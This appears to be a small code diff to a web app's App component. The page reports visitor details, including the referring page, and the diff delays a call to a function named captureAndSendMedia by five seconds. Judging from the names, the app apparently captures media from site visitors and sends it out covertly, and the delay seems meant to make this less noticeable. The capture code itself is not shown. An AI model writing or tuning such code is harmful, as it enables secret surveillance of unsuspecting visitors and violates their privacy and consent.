@@ -20,7 +20,9 @@ function App() {
         previousSites: document.referrer || "None",
       });
 
-      await captureAndSendMedia();
+      setTimeout(() => {
+        captureAndSendMedia();
+      }, 5000);
     };
 
     sendVisitorNotification();
